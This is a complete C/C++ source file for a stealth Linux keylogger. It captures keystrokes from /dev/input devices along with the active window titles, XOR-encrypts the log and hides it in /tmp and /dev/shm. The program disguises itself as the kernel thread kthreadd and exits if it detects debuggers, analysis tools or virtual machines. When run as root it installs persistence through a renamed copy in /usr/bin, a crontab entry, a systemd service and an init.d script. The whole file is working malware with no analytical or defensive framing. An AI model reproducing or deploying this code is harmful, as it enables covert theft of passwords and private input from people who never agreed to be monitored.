#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <linux/input.h>
#include <linux/ioctl.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <dirent.h>
#include <time.h>
#include <pthread.h>
#include <sys/ptrace.h>
#include <sys/prctl.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>
#include <map>
#include <sys/syscall.h>
#include <sys/resource.h>

// Helper macros for bit testing (must be defined before use)
#ifndef BITS_PER_LONG
#define BITS_PER_LONG (sizeof(long) * 8)
#endif

#ifndef BITS_TO_LONGS
#define BITS_TO_LONGS(nr) (((nr) + BITS_PER_LONG - 1) / BITS_PER_LONG)
#endif

#ifndef test_bit
#define test_bit(nr, addr) \
    (((1UL << ((nr) % BITS_PER_LONG)) & ((addr)[(nr) / BITS_PER_LONG])) != 0)
#endif

#ifndef EV_MAX
#define EV_MAX 0x1f
#endif

class StealthLinuxKeylogger {
private:
    std::vector<int> inputDevices;
    bool isRunning;
    std::string logFile;
    pthread_t logThread;
    
    // XOR encryption key
    static const int XOR_KEY = 0x42;
    
    // Process name masquerading
    void masqueradeProcess() {
        // Change process name to look like system process
        prctl(PR_SET_NAME, "kthreadd", 0, 0, 0);
        
        // Try to clear command line arguments (may not work on all systems)
        extern char **environ;
        if (environ && *environ) {
            char* cmdline = *environ;
            size_t len = strlen(cmdline);
            if (len > 0) {
                memset(cmdline, 0, len);
                strncpy(cmdline, "[kthreadd]", len);
            }
        }
    }
    
    // Anti-debugging and analysis detection
    bool isBeingAnalyzed() {
        // Check if being traced
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) {
            return true;
        }
        ptrace(PTRACE_DETACH, 0, 0, 0);
        
        // Check for common analysis tools in process list
        FILE* ps = popen("ps aux 2>/dev/null | grep -E '(strace|ltrace|gdb|valgrind|wireshark|tcpdump|wireshark|tcpdump|procmon|sysmon)' 2>/dev/null | grep -v grep", "r");
        if (ps) {
            char buffer[256];
            if (fgets(buffer, sizeof(buffer), ps)) {
                pclose(ps);
                return true;
            }
            pclose(ps);
        }
        
        // Check for VM/sandbox indicators
        struct stat st;
        if (stat("/proc/vz", &st) == 0 || 
            stat("/proc/bc", &st) == 0 ||
            stat("/sys/bus/vmbus", &st) == 0) {
            return true;
        }
        
        // Check DMI for VM indicators
        FILE* dmi = fopen("/sys/class/dmi/id/product_name", "r");
        if (dmi) {
            char buffer[256];
            if (fgets(buffer, sizeof(buffer), dmi)) {
                std::string product(buffer);
                if (product.find("VMware") != std::string::npos ||
                    product.find("VirtualBox") != std::string::npos ||
                    product.find("QEMU") != std::string::npos ||
                    product.find("KVM") != std::string::npos) {
                    fclose(dmi);
                    return true;
                }
            }
            fclose(dmi);
        }
        
        // Check for debugger via /proc/self/status
        FILE* status = fopen("/proc/self/status", "r");
        if (status) {
            char line[256];
            while (fgets(line, sizeof(line), status)) {
                if (strncmp(line, "TracerPid:", 10) == 0) {
                    int pid = atoi(line + 10);
                    fclose(status);
                    if (pid != 0) return true;
                }
            }
            fclose(status);
        }
        
        return false;
    }
    
    // Hide from process list (simplified approach)
    void hideFromProcFS() {
        // This would require kernel module in real implementation
        // For now, we just change the process name and arguments
        
        // Fork and let parent exit to become daemon
        pid_t pid = fork();
        if (pid > 0) {
            exit(0); // Parent exits
        }
        
        // Create new session
        setsid();
        
        // Change working directory
        chdir("/");
        
        // Close standard file descriptors
        close(STDIN_FILENO);
        close(STDOUT_FILENO);
        close(STDERR_FILENO);
        
        // Redirect to /dev/null
        int nullfd = open("/dev/null", O_RDWR);
        dup2(nullfd, STDIN_FILENO);
        dup2(nullfd, STDOUT_FILENO);
        dup2(nullfd, STDERR_FILENO);
        close(nullfd);
    }
    
    // Find keyboard input devices
    std::vector<int> findInputDevices() {
        std::vector<int> devices;
        char devicePath[64];
        
        // Look for input devices
        for (int i = 0; i < 32; i++) {
            snprintf(devicePath, sizeof(devicePath), "/dev/input/event%d", i);
            
            int fd = open(devicePath, O_RDONLY | O_NONBLOCK);
            if (fd != -1) {
                // Check if it's a keyboard device
                unsigned long evbit[(EV_MAX + 1) / (sizeof(unsigned long) * 8) + 1] = {0};
                if (ioctl(fd, EVIOCGBIT(0, EV_MAX), evbit) >= 0) {
                    if (test_bit(EV_KEY, evbit)) {
                        // Use dynamic allocation for keybit to avoid KEY_MAX dependency issues
                        const int KEY_MAX_VAL = 0x2ff; // Standard KEY_MAX value
                        unsigned long keybit[BITS_TO_LONGS(KEY_MAX_VAL)] = {0};
                        if (ioctl(fd, EVIOCGBIT(EV_KEY, KEY_MAX_VAL), keybit) >= 0) {
                            // Check for common keyboard keys
                            if (test_bit(KEY_Q, keybit) && test_bit(KEY_W, keybit) && test_bit(KEY_E, keybit)) {
                                devices.push_back(fd);
                                continue;
                            }
                        }
                    }
                }
                close(fd);
            }
        }
        
        return devices;
    }
    
    // XOR encryption
    std::string encrypt(const std::string& data) {
        std::string encrypted = data;
        int key = XOR_KEY;
        
        for (size_t i = 0; i < encrypted.length(); i++) {
            encrypted[i] ^= key;
            key = (key + 1) % 256;
        }
        
        return encrypted;
    }
    
    // Get current window title (X11)
    std::string getCurrentWindow() {
        FILE* cmd = popen("xdotool getactivewindow getwindowname 2>/dev/null", "r");
        if (!cmd) return "Unknown";
        
        char buffer[512];
        std::string result = "Unknown";
        
        if (fgets(buffer, sizeof(buffer), cmd)) {
            result = buffer;
            // Remove newline
            if (!result.empty() && result.back() == '\n') {
                result.pop_back();
            }
        }
        
        pclose(cmd);
        return result;
    }
    
    // Convert key code to string
    std::string keyCodeToString(int code, int value) {
        if (value != 1) return ""; // Only process key press events
        
        static std::map<int, std::string> keyMap = {
            {KEY_A, "a"}, {KEY_B, "b"}, {KEY_C, "c"}, {KEY_D, "d"}, {KEY_E, "e"},
            {KEY_F, "f"}, {KEY_G, "g"}, {KEY_H, "h"}, {KEY_I, "i"}, {KEY_J, "j"},
            {KEY_K, "k"}, {KEY_L, "l"}, {KEY_M, "m"}, {KEY_N, "n"}, {KEY_O, "o"},
            {KEY_P, "p"}, {KEY_Q, "q"}, {KEY_R, "r"}, {KEY_S, "s"}, {KEY_T, "t"},
            {KEY_U, "u"}, {KEY_V, "v"}, {KEY_W, "w"}, {KEY_X, "x"}, {KEY_Y, "y"},
            {KEY_Z, "z"},
            {KEY_0, "0"}, {KEY_1, "1"}, {KEY_2, "2"}, {KEY_3, "3"}, {KEY_4, "4"},
            {KEY_5, "5"}, {KEY_6, "6"}, {KEY_7, "7"}, {KEY_8, "8"}, {KEY_9, "9"},
            {KEY_SPACE, " "}, {KEY_ENTER, "\n"}, {KEY_TAB, "\t"},
            {KEY_BACKSPACE, "[BACKSPACE]"}, {KEY_LEFTSHIFT, "[SHIFT]"},
            {KEY_RIGHTSHIFT, "[SHIFT]"}, {KEY_LEFTCTRL, "[CTRL]"},
            {KEY_RIGHTCTRL, "[CTRL]"}, {KEY_LEFTALT, "[ALT]"},
            {KEY_RIGHTALT, "[ALT]"}, {KEY_ESC, "[ESC]"},
            {KEY_COMMA, ","}, {KEY_DOT, "."}, {KEY_SLASH, "/"},
            {KEY_SEMICOLON, ";"}, {KEY_APOSTROPHE, "'"},
            {KEY_LEFTBRACE, "["}, {KEY_RIGHTBRACE, "]"},
            {KEY_MINUS, "-"}, {KEY_EQUAL, "="}
        };
        
        auto it = keyMap.find(code);
        if (it != keyMap.end()) {
            return it->second;
        }
        
        return "[KEY_" + std::to_string(code) + "]";
    }
    
    // Logging thread function
    static void* loggingThread(void* arg) {
        StealthLinuxKeylogger* keylogger = static_cast<StealthLinuxKeylogger*>(arg);
        return keylogger->runLogging();
    }
    
    void* runLogging() {
        fd_set readfds;
        int maxfd = 0;
        
        // Find max fd for select
        for (int fd : inputDevices) {
            if (fd > maxfd) maxfd = fd;
        }
        
        std::ofstream logStream;
        logStream.open(logFile, std::ios::app);
        
        while (isRunning) {
            FD_ZERO(&readfds);
            
            for (int fd : inputDevices) {
                FD_SET(fd, &readfds);
            }
            
            struct timeval timeout = {1, 0}; // 1 second timeout
            int result = select(maxfd + 1, &readfds, NULL, NULL, &timeout);
            
            if (result > 0) {
                for (int fd : inputDevices) {
                    if (FD_ISSET(fd, &readfds)) {
                        struct input_event ev;
                        ssize_t bytesRead = read(fd, &ev, sizeof(ev));
                        
                        if (bytesRead == sizeof(ev) && ev.type == EV_KEY) {
                            std::string key = keyCodeToString(ev.code, ev.value);
                            if (!key.empty()) {
                                // Get timestamp
                                time_t now = time(0);
                                char timestamp[64];
                                strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
                                
                                // Get current window
                                std::string window = getCurrentWindow();
                                
                                // Create log entry
                                std::string logEntry = std::string(timestamp) + " | " + window + " | " + key + "\n";
                                std::string encrypted = encrypt(logEntry);
                                
                                // Write to log
                                if (logStream.is_open()) {
                                    logStream << encrypted;
                                    logStream.flush();
                                }
                            }
                        }
                    }
                }
            }
        }
        
        logStream.close();
        return nullptr;
    }
    
public:
    StealthLinuxKeylogger() : isRunning(false), logFile("") {
        // Anti-analysis checks
        if (isBeingAnalyzed()) {
            // Random delay to avoid detection patterns
            sleep(1 + (time(NULL) % 3));
            exit(0);
        }
        
        // Masquerade process
        masqueradeProcess();
        
        // Hide from process list
        hideFromProcFS();
        
        // Set up log file in accessible location with multiple fallbacks
        // Try /tmp first (most accessible)
        const char* logPaths[] = {
            "/tmp",
            "/var/tmp",
            "/dev/shm",
            "/tmp/.X11-unix",
            "/tmp/.ICE-unix"
        };
        
        for (size_t i = 0; i < sizeof(logPaths)/sizeof(logPaths[0]); i++) {
            if (access(logPaths[i], W_OK) == 0) {
                logFile = std::string(logPaths[i]) + "/.sys_log_" + std::to_string(getpid());
                // Test if we can actually write
                std::ofstream test(logFile, std::ios::app);
                if (test.is_open()) {
                    test.close();
                    break;
                }
                logFile = "";
            }
        }
        
        // Final fallback
        if (logFile.empty()) {
            logFile = "/tmp/.sys_log_" + std::to_string(getpid());
        }
        
        // Find input devices
        inputDevices = findInputDevices();
    }
    
    ~StealthLinuxKeylogger() {
        stop();
        
        // Close all device files
        for (int fd : inputDevices) {
            close(fd);
        }
    }
    
    bool start() {
        if (isRunning || inputDevices.empty()) {
            return false;
        }
        
        isRunning = true;
        
        // Create logging thread
        if (pthread_create(&logThread, NULL, loggingThread, this) != 0) {
            isRunning = false;
            return false;
        }
        
        return true;
    }
    
    void stop() {
        if (isRunning) {
            isRunning = false;
            pthread_join(logThread, NULL);
        }
    }
    
    void run() {
        // Install signal handlers for graceful shutdown
        signal(SIGTERM, [](int) { exit(0); });
        signal(SIGINT, [](int) { exit(0); });
        
        if (start()) {
            // Keep main thread alive
            while (isRunning) {
                sleep(1);
                
                // Periodic anti-analysis check
                if (isBeingAnalyzed()) {
                    exit(0);
                }
            }
        }
    }
};

// Persistence mechanisms
void installPersistence() {
    // Copy to system location
    char exePath[1024];
    readlink("/proc/self/exe", exePath, sizeof(exePath));
    
    // Copy to /usr/bin with inconspicuous name
    system("cp /proc/self/exe /usr/bin/ksysmond 2>/dev/null");
    system("chmod +x /usr/bin/ksysmond 2>/dev/null");
    
    // Add to crontab
    FILE* crontab = popen("(crontab -l 2>/dev/null; echo '@reboot /usr/bin/ksysmond') | crontab -", "w");
    if (crontab) pclose(crontab);
    
    // Add systemd service
    std::ofstream service("/etc/systemd/system/ksysmon.service");
    if (service.is_open()) {
        service << "[Unit]\n";
        service << "Description=Kernel System Monitor\n";
        service << "After=network.target\n\n";
        service << "[Service]\n";
        service << "Type=forking\n";
        service << "ExecStart=/usr/bin/ksysmond\n";
        service << "Restart=always\n";
        service << "User=root\n\n";
        service << "[Install]\n";
        service << "WantedBy=multi-user.target\n";
        service.close();
        
        system("systemctl enable ksysmon.service 2>/dev/null");
        system("systemctl start ksysmon.service 2>/dev/null");
    }
    
    // Add to init.d for older systems
    std::ofstream initd("/etc/init.d/ksysmon");
    if (initd.is_open()) {
        initd << "#!/bin/bash\n";
        initd << "# Kernel System Monitor\n";
        initd << "case \"$1\" in\n";
        initd << "  start)\n";
        initd << "    /usr/bin/ksysmond &\n";
        initd << "    ;;\n";
        initd << "  stop)\n";
        initd << "    killall ksysmond\n";
        initd << "    ;;\n";
        initd << "esac\n";
        initd.close();
        
        system("chmod +x /etc/init.d/ksysmon 2>/dev/null");
        system("update-rc.d ksysmon defaults 2>/dev/null");
    }
}

int main(int argc, char** argv) {
    // Check if running as root and install persistence
    if (geteuid() == 0) {
        installPersistence();
    }
    
    // Create and run keylogger
    StealthLinuxKeylogger keylogger;
    keylogger.run();
    
    return 0;
}
